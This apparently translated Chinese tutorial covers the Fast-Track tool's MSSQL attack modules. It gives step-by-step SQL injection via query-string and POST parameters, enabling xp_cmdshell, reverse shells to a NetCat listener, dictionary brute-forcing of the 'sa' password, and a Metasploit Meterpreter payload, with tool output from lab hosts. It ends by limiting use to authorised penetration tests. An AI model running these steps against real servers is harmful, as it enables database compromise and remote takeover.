### Microsoft SQL Tools 部署攻击

从主菜单中选择 **Microsoft SQL Tools** 开始部署攻击，然后选择 **MSSQLInjector**。具体步骤如下：

1. 选择工具列表中的一个选项：
   ```
   Pick a list of the tools from below:
   01. MSSQL Injector
   2. MSSQL Bruter
   3. SQLPwnage
   Enter your choice: 1
   ```

2. 最简单的SQL注入方式是操纵查询语句字段，这些字段通常位于从浏览器发送到服务器的URL中。URL通常包含动态查询网页信息的一些参数。Fast-Track通过在查询语句参数中加入 `INJECTHERE` 来识别注入点，例如：
   ```
   http://www.Secmaniac.com/index.asp?id='INJECTHERE&date=2011
   ```

3. 当Fast-Track开始攻击漏洞时，它会查找带有 `id` 字符串的所有字段，以确定哪个字段可以被用来进行攻击。选择第一个选项来查看攻击是如何进行的：
   ```
   Enter which SQL Injector you want to use
   01. SQL Injector - Query String Parameter Attack
   2. SQL Injector - POST Parameter Attack
   3. SQL Injector - GET FTP Payload Attack
   Enter your choice: 1
   ```

4. 输入易受攻击站点的URL，并记得在可注入参数处使用 `INJECTHERE`：
   ```
   Enter the URL of the susceptible site, remember to put 'INJECTHERE' for the injectable parameter
   Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
   Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2011
   ```

5. Fast-Track将发送初始请求以启用 `xp_cmdshell`（如果禁用），并分段发送载荷：
   ```
   Sending initial request to enable xp_cmdshell if disabled...
   Sending first portion of payload (1/4)...
   Sending second portion of payload (2/4)...
   Sending third portion of payload (3/4)...
   Sending the last portion of the payload (4/4)...
   Running cleanup before executing the payload...
   Running the payload on the server...
   listening on [any] 4444 ...
   connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
   Microsoft Windows [Version 5.2.3790]
   (C) Copyright 1985-2003 Microsoft Corp.
   C:\WINDOWS\system32>
   ```

6. 成功！完全控制了目标系统，整个过程都是通过SQL注入完成的。注意，如果Web应用程序中使用了参数化的SQL查询语句或存储过程，攻击将不会成功。此外，该攻击所需的配置非常少。在攻击菜单选择了 **SQL Injector - Query String Parameter Attack** 后，只需为Fast-Track提供一个SQL注入点即可。如果 `xp_cmdshell` 存储过程功能关闭，Fast-Track将自动激活该存储过程，并尝试提升MS SQL的权限。

### SQL注入 - POST 参数攻击

Fast-Track的POST参数攻击比查询字符串攻击需要更少的配置。步骤如下：

1. 选择要使用的SQL注入器：
   ```
   Enter which SQL Injector you want to use
   1. SQL Injector - Query String Parameter Attack
   2. SQL Injector - POST Parameter Attack
   3. SQL Injector - GET FTP Payload Attack
   Enter your choice: 2
   ```

2. 输入要攻击的网站URL，Fast-Track将自动对每个参数进行SQL注入，查找基于错误和盲注的注入点：
   ```
   This portion allows you to attack all forms on a specific website without having to specify each parameter. Just type the URL in, and Fast-Track will auto SQL inject to each parameter looking for both error based injection as well as blind based SQL injection. Simply type the website you want to attack, and let it roll.
   Example: http://www.sqlinjectablesite.com/index.aspx
   Enter the URL to attack: http://www.secmaniac.com
   Forms detected... attacking the parameters in hopes of exploiting SQL Injection..
   ```

3. Fast-Track将自动检测POST提交参数并注入攻击参数，通过SQL注入完全控制目标主机：
   ```
   Sending payload to parameter: txtlogin
   Sending payload to parameter: txtPassword
   [-] The PAYLOAD is being delivered. This can take up to two minutes. [-]
   listening on [any] 4444 ...
   connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1041
   Microsoft Windows [Version 5.2.3790]
   (C) Copyright 1985-2003 Microsoft Corp.
   C:\WINDOWS\system32>
   ```

### 手工注入

如果你有另一个IP地址用于监听反弹Shell，或者需要对设置进行微调，可以使用手工注入：

1. 选择要使用的SQL注入器：
   ```
   Enter which SQL Injector you want to use
   1. SQL Injector - Query String Parameter Attack
   2. SQL Injector - POST Parameter Attack
   3. SQL Injector - GET FTP Payload Attack
   4. SQL Injector - GET Manual Setup Binary Payload Attack
   Enter your choice: 4
   ```

2. 输入易受攻击站点的URL，并在可注入参数处使用 `INJECTHERE`：
   ```
   The manual portion allows you to customize your attack for whatever reason. You will need to designate where in the URL the SQL Injection is by using 'INJECTHERE'.
   So for example, when the tool asks you for the SQL Injectable URL, type:
   http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
   Enter the URL of the susceptible site, remember to put 'INJECTHERE' for the injectible parameter
   Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
   Enter here: http://www.secmaniac.com/index.asp?id='INJECTHERE&date=2010
   ```

3. 输入监听NetCat的服务器IP地址和端口号：
   ```
   Enter the IP Address of server with NetCat Listening: 10.211.55.130
   Enter Port number with NetCat listening: 9090
   ```

4. Fast-Track将发送初始请求以启用 `xp_cmdshell`（如果禁用），并分段发送载荷：
   ```
   Sending initial request to enable xp_cmdshell if disabled....
   Sending first portion of payload....
   Sending second portion of payload....
   Sending next portion of payload...
   Sending the last portion of the payload...
   Running cleanup...
   Running the payload on the server...
   listening on [any] 9090..
   10.211.55.128: inverse host lookup failed: Unknown server error: Connection timed out
   connect to [10.211.55.130] from (UNKNOWN) [10.211.55.128] 1045
   Microsoft Windows [Version 5.2.3790]
   (C) Copyright 1985-2003 Microsoft Corp.
   C:\WINDOWS\system32>
   ```

### MS SQL 破解

MSSQL破解功能适用于Windows认证、SQL认证或混合认证模式。步骤如下：

1. 选择要使用的工具：
   ```
   Microsoft SQL Attack Tools
   Pick a list of the tools from below:
   1. MSSQL Injector
   2. MSSQL Bruter
   3. SQLPwnage
   Enter your choice: 2
   ```

2. 输入要攻击的IP地址和端口号：
   ```
   Enter the IP Address and Port Number to Attack.
   Options: (a) Attempt SQL Ping and Auto Quick Brute Force
            (m) Mass scan and dictionary brute
            (s) Single Target (Attack a Single Target with big dictionary)
            (f) Find SQL Ports (SQL Ping)
            (i) I want a command prompt and know which system is vulnerable
            (v) Vulnerable system, I want to add a local admin on the box...
            (e) Enable xp_cmdshell if it's disabled (sql2k and sql2k5)
   Enter Option: a
   ```

3. 输入SQL数据库的用户名：
   ```
   Enter username for SQL database (example: sa): sa
   Configuration file not detected, running default path.
   Recommend running setup.py install to configure Fast-Track.
   Setting default directory...
   Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255): 10.211.55.1/24
   Do you want to perform advanced identification, yes or no: yes
   [-] Launching SQL Ping, this may take a while to footprint....[-]
   [*] Please wait while we load the module tree...
   Brute forcing username: sa
   ```

4. Fast-Track将尝试暴力破解密码：
   ```
   Brute forcing password of password2 on IP 10.211.55.128:1433
   Brute forcing password of on IP 10.211.55.128:1433
   Brute forcing password of password on IP 10.211.55.128:1433
   10.211.55.128:1433
   Brute forcing password of sqlserver on IP 10.211.55.128:1433
   Brute forcing password of sql on IP 10.211.55.128:1433
   Brute forcing password of password1 on IP 10.211.55.128:1433
   Brute forcing password of password123 on IP 10.211.55.128:1433
   Brute forcing password of complexpassword on IP 10.211.55.128:1433
   Brute forcing password of database on IP 10.211.55.128:1433
   Brute forcing password of server on IP 10.211.55.128:1433
   Brute forcing password of changeme on IP 10.211.55.128:1433
   Brute forcing password of change on IP 10.211.55.128:1433
   Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433
   Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433
   Brute forcing password of Sqlserver on IP 10.211.55.128:1433
   Brute forcing password of SqlServer on IP 10.211.55.128:1433
   Brute forcing password of Password1 on IP 10.211.55.128:1433
   ```

5. 显示成功破解的SQL服务器：
   ```
   The following SQL Servers were compromised:
   *******************************************
   1. 10.211.55.128:1433 *** U/N: sa P/W: password ***
   To interact with system, enter the SQL Server number.
   Example: 1.192.168.1.32 you would type 1
   Enter the number: 1
   Enabling: XP_Cmdshell...
   Finished trying to re-enable xp_cmdshell stored procedure if disabled.
   Configuration file not detected, running default path.
   Recommend running setup.py install to configure Fast-Track.
   Setting default directory...
   What port do you want the payload to connect to you on: 4444
   Metasploit Reverse Meterpreter Upload Detected..
   Launching Meterpreter Handler.
   Creating Metasploit Reverse Meterpreter Payload.
   Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6
   Sending payload: ac8cbc47714aaeed2672d69e251cee3dfbad
   Metasploit payload delivered..
   Converting our payload to binary, this may take a few..
   Cleaning up...
   Launching payload, this could take up to a minute...
   When finished, close the metasploit handler window to return to other compromised SQL Servers.
   [*] Please wait while we load the module tree...
   [*] Handler binding to LHOST 0.0.0.0
   [*] Started reverse handler
   [*] Starting the payload handler...
   ```

通过以上步骤，你可以使用Fast-Track进行SQL注入攻击和MSSQL破解。请注意，这些操作涉及非法活动，仅应在合法授权的渗透测试环境中进行。